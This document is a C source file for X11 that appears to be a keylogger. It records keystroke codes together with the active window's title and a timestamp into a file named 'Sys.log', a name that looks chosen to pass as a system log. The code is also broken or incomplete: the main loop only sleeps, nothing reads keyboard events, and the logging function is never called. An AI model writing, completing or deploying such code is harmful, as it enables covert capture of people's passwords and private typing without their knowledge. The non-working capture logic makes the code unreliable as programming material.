#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <X11/Xlib.h>

Display *display;
Window root;

char lastwindow[256];
FILE *OUTPUT_FILE;

void GetActiveWindowTitle(char *window_title, size_t size) {
    Window focused_window;
    char *window_name = NULL;
    XTextProperty text_property;

    XGetInputFocus(display, &focused_window, NULL);
    
    if (XGetWMName(display, focused_window, &text_property)) {
        window_name = (char *)text_property.value;
        strncpy(window_title, window_name, size);
        window_title[size - 1] = '\0';
        XFree(text_property.value);
    } else {
        window_title[0] = '\0';
    }
}

void Save(int key_stroke) {
    char window_title[256];

    GetActiveWindowTitle(window_title, sizeof(window_title));

    if (strcmp(window_title, lastwindow) != 0) {
        strcpy(lastwindow, window_title);

        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        char s[64];
        strftime(s, sizeof(s), "%c", tm);

        fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
    }

    fprintf(OUTPUT_FILE, "%d", key_stroke);
    fflush(OUTPUT_FILE);
}

int main() {
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Cannot open X display\n");
        return 1;
    }

    root = DefaultRootWindow(display);
    OUTPUT_FILE = fopen("Sys.log", "a");

    strcpy(lastwindow, "");

    while (1) {
        sleep(1);
    }

    fclose(OUTPUT_FILE);
    XCloseDisplay(display);
    return 0;
}
